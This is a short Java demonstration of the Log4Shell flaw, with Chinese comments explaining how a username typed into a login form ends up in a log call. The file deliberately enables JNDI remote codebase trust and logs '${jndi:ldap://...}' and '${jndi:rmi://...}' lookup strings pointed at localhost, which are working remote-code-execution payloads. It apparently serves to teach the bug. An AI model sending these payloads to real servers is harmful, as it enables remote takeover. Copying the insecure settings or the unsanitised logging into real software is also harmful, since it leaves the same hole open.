import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4jController {
    private static final Logger logger = LogManager.getLogger(Log4jController.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        // 普通内容
        logger.error("username");

        // 本机内容
        logger.error("${java:vm}");

        // ldap
        logger.error("${jndi:ldap://127.0.0.1:1389/RCEK}");

        // RMI
        logger.error("${jndi:rmi://127.0.0.1:1234/rce}");
    }

//    //上面代码是最简单的例子，下面是一个简单web请求的过程描述。
//
//    // 用户登录接口
//    @RequestMapping("login")
//    public String login(User user){
//        // 用户输入的信息中，用户名 user.username 为 ${jndi:ldap://127.0.0.1:1389/a}
//        // 根据用户输入的帐号密码查询数据库，发现没有该用户。
//        // 打印日记，也顺便输出用户输入的内容，便于以后处理bug。
//        logger.error(user.toString()); // <-- 把这里抽出来，就是上面的例子
//        // 返回"error"
//        return "error";
//    }
}
